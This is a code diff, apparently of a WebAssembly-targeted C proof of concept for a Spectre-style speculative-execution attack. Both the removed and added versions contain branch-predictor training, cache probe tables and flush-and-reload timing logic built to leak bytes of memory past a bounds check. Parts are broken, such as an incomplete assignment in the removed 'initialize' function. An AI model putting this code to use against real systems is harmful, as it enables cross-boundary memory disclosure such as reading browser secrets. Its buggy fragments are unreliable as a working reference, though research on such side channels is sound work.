@@ -1,99 +1,51 @@
-extern void startTimer();
-extern unsigned stopTimer();
-extern void log(unsigned);
+#include <stdlib.h>
 
-const unsigned PAGE_SIZE = 1 << 12;
-const unsigned BYTE_LENGTH = sizeof(char) * (1 << 8);
-const unsigned PROBE_LENGTH = PAGE_SIZE * BYTE_LENGTH;
+typedef unsigned char byte;
 
-unsigned char probe_table[PROBE_LENGTH];
-unsigned char length_table[PROBE_LENGTH];
-unsigned char secret_table[PROBE_LENGTH];
+//  extern void startTimer();
+// extern unsigned stopTimer();
+extern void _log(unsigned argument);
+extern unsigned probeTable(byte* probe_table_address);
 
-const unsigned CACHE_SIZE = 4 * (1 << 20);
-const unsigned CACHE_LINE_SIZE = 64;
-const unsigned FLUSH_ARRAY_LENGTH = CACHE_SIZE / (BYTE_LENGTH * sizeof(unsigned));
-unsigned flush_array[FLUSH_ARRAY_LENGTH];
+byte secret_table[1];
 
-unsigned time_table[BYTE_LENGTH];
-unsigned char junk = 0;
+byte junk = 0;
 
-const unsigned probeTable() {
-
-    // log(1001);
-    for (unsigned i = 0; i < BYTE_LENGTH; ++i) {
-        // log(1002);
-        unsigned probe_index = i * PAGE_SIZE;
-        startTimer();
-        // access the probe table
-        junk ^= probe_table[probe_index];
-        time_table[i] = stopTimer();
-    }
-    unsigned zero_counter = 0;
-    unsigned min_index = 0 & junk;
-    unsigned min_value = 0xffffffff;
-    for (unsigned i = 0; i < BYTE_LENGTH; ++i) {
-        const unsigned value = time_table[i];
-        zero_counter += value == 0;
-        // log(value);
-        if (value < min_value) {
-            min_value = value;
-            min_index = i;
-        }
-    }
-    if (zero_counter > 1) {
-        return -1;
-    }
-    return min_index;
-}
-
-unsigned char flushCache() {
-    for (unsigned i = 0; i < FLUSH_ARRAY_LENGTH; i += CACHE_LINE_SIZE) {
-        junk ^= flush_array[i];
-    }
-    return junk;
-}
-
-int initialize() {
-    // write probe length in the length part of the heap
-    for (unsigned i = 0; i < PROBE_LENGTH; i += PAGE_SIZE) {
-        length_table[i] = ;
-    }
-    return 0;
-}
-
-
-void speculativelyAccessAddress(address) {
-    // if address < 256 -> valid address (for training)
-    // else invalid address for secret extraction
-    static unsigned char length_address = 0;
-    // fetch the length from length_table from RAM to trigger speculative execution
-    if (address < length_table[length_address++ * PAGE_SIZE] * 256) {
-        // make request to probe_table at the index that corresponds with the value of secret_table[address]
-        junk ^= probe_table[secret_table[address] * PAGE_SIZE];
-    }
-}
-
-// export static information
-const unsigned getPageSize() {
-    return PAGE_SIZE;
-}
-
-const unsigned getProbeLength() {
-    return PROBE_LENGTH;
-}
-
-unsigned char * getProbeAddress() {
-    return probe_table;
-}
-
-unsigned char * getSecretAddress() {
+byte* getSecretTableAddress() {
     return secret_table;
 }
 
-unsigned reload(unsigned char probe_index) {
-    // test
-    flushCache();
-    const unsigned char junk = probe_table[probe_index * PAGE_SIZE];
-    return probeTable() | junk;
+unsigned TRAINING_CONSTANT = 10;
+unsigned training_counter = 0;
+
+byte speculativelyReadAddress(unsigned address, unsigned repetitions, unsigned page_size, unsigned probe_length) {
+    unsigned index = address - (unsigned) secret_table;
+    byte* valid_access_indicator_array = (byte*) malloc(repetitions * TRAINING_CONSTANT * page_size);
+    // one valid-dummy space for each iteration (inefficient but simple)
+    byte* probe_tables = (byte*) malloc((repetitions * probe_length + 1) * page_size);
+    training_counter = 0;
+    for (unsigned i = 0; i < repetitions * TRAINING_CONSTANT; ++i) {
+        const byte invalid_access = !((i + 1) % TRAINING_CONSTANT);
+        const unsigned fixed_index = index & -invalid_access;
+        // load condition from RAM so speculative execution gets triggered
+        // _log(fixed_index);
+        if (~valid_access_indicator_array[i * page_size] & !invalid_access) {
+            const byte secret_value = secret_table[fixed_index];
+            // _log((secret_value & -invalid_access | !invalid_access << 8) * page_size);
+            // map valid accesses to the address (probe_tables)
+            // map invalid accesses to their respective probe boxes
+            junk ^= probe_tables[(1 + i * probe_length + secret_value) * page_size & -invalid_access];
+        }
+        // _log(89);
+        if (invalid_access) {
+            // probe table
+            // timing results are stored in JS-land
+            byte* probe_table = probe_tables + (1 + training_counter++ * probe_length) * page_size;
+            probeTable(probe_table);
+        }
+    }
+    // freeing not possible due to WASM linear memory and FIRST_USE_PARADIGM
+    // just reset the current_memory_position without zeroing
+    free(valid_access_indicator_array);
+    return junk;
 }
